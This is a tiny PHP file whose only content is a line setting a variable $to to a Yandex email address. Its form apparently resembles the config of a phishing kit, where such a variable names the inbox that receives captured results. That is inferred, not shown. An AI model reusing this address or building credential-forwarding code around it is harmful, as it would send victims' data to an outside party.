<?

$to = "resultlogan@yandex.com";

?>